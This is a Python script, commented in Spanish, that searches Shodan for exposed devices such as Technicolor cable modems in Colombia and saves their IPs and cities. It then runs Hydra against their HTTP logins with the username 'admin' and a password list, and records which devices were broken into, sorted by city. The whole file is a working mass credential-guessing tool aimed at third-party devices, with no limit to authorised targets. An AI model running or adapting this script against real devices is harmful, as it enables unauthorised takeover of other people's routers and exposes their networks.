#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nombre del archivo: shodan-scan-ver10.py
Descripción: 
    Este script ejecuta la opción "search" de SHODAN para obtener una lista de direcciones IP que 
    coinciden con una consulta específica, las almacena en un archivo y posteriormente ejecuta 
    Hydra para intentar descubrir credenciales en esos dispositivos.

    Flujo del script:
    1. Busca dispositivos en SHODAN según la consulta proporcionada.
    2. Extrae las direcciones IP y las almacena en archivos de texto.
    3. Ejecuta Hydra utilizando un diccionario de contraseñas y las IPs obtenidas.
    4. Genera resultados ordenados y asociados a las ciudades de las IPs.

Requisitos previos:
    - Crear y activar un entorno virtual:
        $ source path/to/venv/bin/activate
    - Instalar la biblioteca python-dotenv:
        (venv)$ pip install python-dotenv
    - Tener instalado Hydra.

Uso:
    Ejecutar el script con una consulta de SHODAN y un puerto opcional:
        (venv)$ python3 shodan-scan-ver10.py "technicolor country:co"
        (venv)$ python3 shodan-scan-ver10.py "technicolor country:co" -p 8080

Ejemplo:
    Para encontrar cable-modems Technicolor en Colombia y probar credenciales:
        (venv)$ python3 shodan-scan-ver10.py technicolor country:co 

Dependencias:
    - shodan
    - argparse
    - dotenv
    - subprocess
    - re
    - os
    - sys
    - ipaddress

Archivos generados:
    - ips.txt: Lista de IPs obtenidas de SHODAN.
    - ips-ciudad.txt: Lista de IPs junto con su ciudad correspondiente.
    - resultados_hydra.txt: Resultados de la ejecución de Hydra.
    - resultados_hydra_sorted.txt: Lista de IPs vulneradas ordenadas.
    - resultados_hydra-ciudad.txt: IPs vulneradas con su respectiva ciudad.

Autor: Siler Amador Donado
Fecha de última modificación: 2025-02-20
Versión: 1.0
Licencia: MIT
"""

import shodan
import sys
import subprocess
import argparse
import ipaddress
from dotenv import load_dotenv
import os
import re

# Constantes
ARCHIVO_IPS = "ips.txt"
ARCHIVO_IPS_CIUDAD = "ips-ciudad.txt"
ARCHIVO_PASS = "router.pass"
ARCHIVO_RESULTADOS = "resultados_hydra.txt"
ARCHIVO_RESULTADOS_ORDENADO = "resultados_hydra_sorted.txt"
ARCHIVO_RESULTADOS_CIUDAD = "resultados_hydra-ciudad.txt"
SHODAN_ENV_FILE = "SHODAN_API_KEY.env"

# Función para cargar la API key desde el archivo .env
def cargar_api_key():
    load_dotenv(SHODAN_ENV_FILE)
    api_key = os.getenv('SHODAN_API_KEY')

    if not api_key:
        print("Error: API_KEY no está definida en el archivo .env.")
        sys.exit(1)

    return api_key

# Función para validar los argumentos de entrada con argparse
def obtener_argumentos():
    parser = argparse.ArgumentParser(description="Escanear dispositivos en SHODAN y ejecutar Hydra.")
    parser.add_argument("query", nargs="+", help="Consulta de búsqueda en SHODAN.")
    parser.add_argument("-p", "--puerto", type=int, default=8080, help="Puerto a utilizar en Hydra (por defecto: 8080).")
    return parser.parse_args()

# Función para verificar si Hydra está instalado
def verificar_hydra():
    if subprocess.run(["which", "hydra"], capture_output=True).returncode != 0:
        print("Error: Hydra no está instalado. Instálalo antes de ejecutar el script.")
        sys.exit(1)

# Función para buscar dispositivos en SHODAN y extraer IPs y ciudad
def buscar_dispositivos(api, query):
    try:
        return api.search(query)
    except shodan.APIError as e:
        print(f"Error en la API de Shodan: {e}")
        sys.exit(1)

# Función para guardar IPs y ciudades en archivos ordenados
def guardar_ips(result):
    datos_ips = [(service['ip_str'], service.get('location', {}).get('city', 'Desconocida'))
                 for service in result.get('matches', [])]

    if not datos_ips:
        print("No se encontraron IPs en la búsqueda.")
        sys.exit(0)

    # Ordenar las IPs por dirección IP
    datos_ips.sort(key=lambda x: ipaddress.ip_address(x[0]))

    # Guardar solo las IPs en ips.txt
    with open(ARCHIVO_IPS, 'w', encoding='utf-8') as file:
        file.writelines(f"{ip}\n" for ip, _ in datos_ips)

    # Guardar IPs y ciudades en ips-ciudad.txt
    with open(ARCHIVO_IPS_CIUDAD, 'w', encoding='utf-8') as file:
        file.writelines(f"{ip} - {ciudad}\n" for ip, ciudad in datos_ips)

    print(f"Se han guardado {len(datos_ips)} IPs en '{ARCHIVO_IPS}' (ordenadas).")
    print(f"Se han guardado {len(datos_ips)} IPs con ciudad en '{ARCHIVO_IPS_CIUDAD}'.")

# Función para verificar la existencia de archivos necesarios
def verificar_archivos():
    if not os.path.exists(ARCHIVO_PASS):
        print(f"Error: El archivo '{ARCHIVO_PASS}' no existe. Crea este archivo con las contraseñas.")
        sys.exit(1)
    if not os.path.exists(ARCHIVO_IPS):
        print(f"Error: El archivo '{ARCHIVO_IPS}' no existe.")
        sys.exit(1)

# Función para ejecutar Hydra con control de errores
def ejecutar_hydra(puerto):
    hydra_command = [
        'hydra', '-l', 'admin', '-P', ARCHIVO_PASS, '-e', 'ns',
        '-s', str(puerto), '-o', ARCHIVO_RESULTADOS, '-vV', '-M', ARCHIVO_IPS, 'http-get'
    ]

    try:
        print(f"Ejecutando Hydra en puerto {puerto}...")
        subprocess.run(hydra_command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar Hydra: {e}")
    except KeyboardInterrupt:
        print("\nEjecución de Hydra interrumpida por el usuario.")
    finally:
        print("Proceso de Hydra terminado.")

# Función para extraer IPs exitosas de resultados_hydra.txt
def extraer_ips_desde_resultados():
    if os.path.exists(ARCHIVO_RESULTADOS):
        with open(ARCHIVO_RESULTADOS, 'r', encoding='utf-8') as file:
            contenido = file.readlines()

        # Extraer IPs exitosas de Hydra
        ips_encontradas = set()
        for linea in contenido:
            match = re.search(r'(\d+\.\d+\.\d+\.\d+)', linea)
            if match:
                ips_encontradas.add(match.group(1))

        if ips_encontradas:
            ips_ordenadas = sorted(ips_encontradas, key=ipaddress.ip_address)
            with open(ARCHIVO_RESULTADOS_ORDENADO, 'w', encoding='utf-8') as file:
                file.writelines(f"{ip}\n" for ip in ips_ordenadas)

            print(f"IPs de Hydra ordenadas guardadas en '{ARCHIVO_RESULTADOS_ORDENADO}'.")
        else:
            print("No se encontraron IPs en los resultados de Hydra.")

# Función para generar resultados_hydra-ciudad.txt con IPs y ciudades exitosas
def generar_resultados_ciudad():
    if os.path.exists(ARCHIVO_IPS_CIUDAD) and os.path.exists(ARCHIVO_RESULTADOS_ORDENADO):
        # Cargar el mapeo de IPs con ciudades
        ip_ciudad_map = {}
        with open(ARCHIVO_IPS_CIUDAD, 'r', encoding='utf-8') as file:
            for linea in file:
                partes = linea.strip().split(" - ")
                if len(partes) == 2:
                    ip, ciudad = partes
                    ip_ciudad_map[ip] = ciudad

        # Filtrar las IPs que coinciden con la clave en Hydra
        with open(ARCHIVO_RESULTADOS_ORDENADO, 'r', encoding='utf-8') as file:
            ips_exitosas = [line.strip() for line in file]

        resultados_ciudad = [(ip, ip_ciudad_map.get(ip, 'Desconocida')) for ip in ips_exitosas]

        with open(ARCHIVO_RESULTADOS_CIUDAD, 'w', encoding='utf-8') as file:
            file.writelines(f"{ip} - {ciudad}\n" for ip, ciudad in resultados_ciudad)

        print(f"Resultados con ciudades guardados en '{ARCHIVO_RESULTADOS_CIUDAD}'.")

# Función principal
def main():
    args = obtener_argumentos()

    # Cargar la API Key
    api_key = cargar_api_key()

    # Inicializar API de Shodan
    api = shodan.Shodan(api_key)

    # Construir la consulta de búsqueda
    query = " ".join(args.query)
    print(f"Buscando en SHODAN: {query}")

    # Realizar la búsqueda en SHODAN
    result = buscar_dispositivos(api, query)

    # Guardar IPs y ciudades
    guardar_ips(result)

    # Verificar archivos necesarios antes de ejecutar Hydra
    verificar_archivos()

    # Verificar instalación de Hydra
    verificar_hydra()

    # Ejecutar Hydra
    ejecutar_hydra(args.puerto)

    # Extraer y ordenar IPs de resultados_hydra.txt
    extraer_ips_desde_resultados()

    # Generar resultados con ciudad
    generar_resultados_ciudad()

if __name__ == '__main__':
    main()
